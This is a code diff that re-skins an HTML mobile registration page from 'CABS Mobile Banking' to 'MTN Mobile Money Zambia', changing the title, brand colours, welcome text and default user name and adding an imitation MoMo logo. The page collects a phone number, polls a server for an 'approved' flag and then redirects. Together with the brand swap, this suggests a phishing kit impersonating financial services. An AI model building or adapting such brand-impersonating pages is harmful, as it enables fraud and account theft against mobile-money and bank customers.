@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>CABS Mobile Banking - Registration</title>
+    <title>MTN Mobile Money - Register</title>
     <style>
         * {
             margin: 0;
@@ -24,14 +24,30 @@
         .top-bar {
             width: 100%;
             height: 72px;
-            background: #0d47a1;
+            background: #FFCC00; /* MTN Yellow */
             display: flex;
             align-items: center;
             padding: 0 22px;
             flex-shrink: 0;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+        }
+        .top-bar .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .top-bar .logo svg {
+            height: 36px;
+            width: auto;
+        }
+        .top-bar .logo span {
+            font-weight: 700;
+            font-size: 18px;
+            color: #004B87; /* MTN Blue */
+            letter-spacing: -0.5px;
         }
         .back-btn {
-            color: #fff;
+            color: #004B87;
             text-decoration: none;
             font-size: 30px;
             font-weight: 300;
@@ -55,7 +71,7 @@
         .title {
             font-size: 28px;
             font-weight: 700;
-            color: #0d47a1;
+            color: #004B87;
             margin-bottom: 6px;
             letter-spacing: -0.5px;
         }
@@ -74,7 +90,7 @@
         .phone-input-wrap input {
             width: 100%;
             height: 58px;
-            border: 2px solid #0d47a1;
+            border: 2px solid #004B87;
             border-radius: 10px;
             background: #fff;
             padding: 0 16px 0 90px;
@@ -88,8 +104,8 @@
             font-weight: 400;
         }
         .phone-input-wrap input:focus {
-            border-color: #0d47a1;
-            box-shadow: 0 0 0 3px rgba(13, 71, 161, 0.2);
+            border-color: #FFCC00;
+            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.3);
         }
         .country-code {
             position: absolute;
@@ -98,7 +114,7 @@
             transform: translateY(-50%);
             font-size: 17px;
             font-weight: 600;
-            color: #0d47a1;
+            color: #004B87;
             pointer-events: none;
             display: flex;
             align-items: center;
@@ -107,7 +123,7 @@
         .country-code::after {
             content: "▼";
             font-size: 12px;
-            color: #0d47a1;
+            color: #004B87;
             margin-left: 4px;
         }
         .bottom-section {
@@ -128,18 +144,19 @@
             font-size: 20px;
             font-weight: 700;
             color: #fff;
-            background: #b7cff0;
+            background: #ccc;
             cursor: not-allowed;
             transition: .2s;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
         button:enabled {
-            background: #0d47a1;
+            background: #FFCC00;
+            color: #004B87;
             cursor: pointer;
         }
         button:enabled:hover {
-            background: #0a3a8a;
+            background: #e6b800;
         }
         .status {
             display: none;
@@ -159,15 +176,13 @@
             width: 34px;
             height: 34px;
             margin: 18px auto 0;
-            border: 3px solid rgba(13, 71, 161, .15);
-            border-top: 3px solid #0d47a1;
+            border: 3px solid rgba(0, 75, 135, .15);
+            border-top: 3px solid #004B87;
             border-radius: 50%;
             animation: spin .8s linear infinite;
         }
         @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
+            to { transform: rotate(360deg); }
         }
         @media (max-width: 480px) {
             .container {
@@ -221,11 +236,20 @@
 
     <div class="top-bar">
         <a href="javascript:history.back()" class="back-btn">&#8592;</a>
+        <div class="logo">
+            <!-- MTN MoMo SVG Logo (placeholder) -->
+            <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
+                <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
+                <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN MoMo</text>
+            </svg>
+            <span>Mobile Money</span>
+        </div>
     </div>
 
     <div class="container">
         <div class="title">Registration</div>
-        <div class="subtitle">Welcome to CABS Mobile Banking</div>
+        <div class="subtitle">Welcome to MTN Mobile Money Zambia</div>
 
         <form id="detailsForm" class="form-content">
             <div class="phone-input-wrap">
@@ -293,7 +317,7 @@
         // Main logic
         let fullName = localStorage.getItem('fullName');
         if (!fullName) {
-            fullName = 'CABS User';
+            fullName = 'MTN User';
             localStorage.setItem('fullName', fullName);
         }
 
@@ -372,7 +396,7 @@
                     }
                     if (data.approved === true) {
                         clearInterval(interval);
-                        window.location.href = 'link.html'; // fallback redirect
+                        window.location.href = 'link.html'; // fallback
                     }
                 } catch (error) {
                     console.error('Polling error:', error);
